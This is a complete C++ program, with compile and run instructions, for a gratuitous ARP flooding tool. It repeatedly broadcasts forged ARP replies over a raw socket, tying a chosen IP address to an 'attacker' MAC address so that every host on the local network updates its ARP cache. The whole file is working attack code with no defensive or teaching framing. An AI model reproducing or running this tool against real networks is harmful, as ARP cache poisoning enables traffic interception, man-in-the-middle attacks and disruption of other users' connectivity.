// Compile: g++ -o arp_gratuitous arp_gratuitous.cpp
// Run: sudo ./arp_gratuitous <spoofed_ip> <attacker_mac> <iface> <count>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class GratuitousARPFlood {
private:
    int sock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    GratuitousARPFlood(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Gratuitous ARP - broadcast unsolicited ARP replies
    // Forces ALL hosts on LAN to update their ARP caches
    void sendGratuitous(const std::string& spoofedIP, const std::string& attackerMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        // Broadcast destination
        memset(eth->ether_dhost, 0xFF, 6);
        macToBytes(attackerMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(attackerMAC, arp->arp_sha);
        inet_pton(AF_INET, spoofedIP.c_str(), arp->arp_spa);
        // Target = broadcast
        memset(arp->arp_tha, 0x00, 6);
        inet_pton(AF_INET, spoofedIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memset(sll.sll_addr, 0xFF, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void flood(const std::string& spoofedIP, const std::string& attackerMAC, int count) {
        std::cout << "[*] Gratuitous ARP flood: " << count << " packets\n";
        for (int i = 0; i < count; i++) {
            sendGratuitous(spoofedIP, attackerMAC);
            usleep(10000);  // 10ms between packets
        }
    }
    
    ~GratuitousARPFlood() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <spoofed_ip> <attacker_mac> <iface> <count>\n";
        return 1;
    }
    GratuitousARPFlood flood(argv[3]);
    flood.flood(argv[1], argv[2], atoi(argv[4]));
    return 0;
}
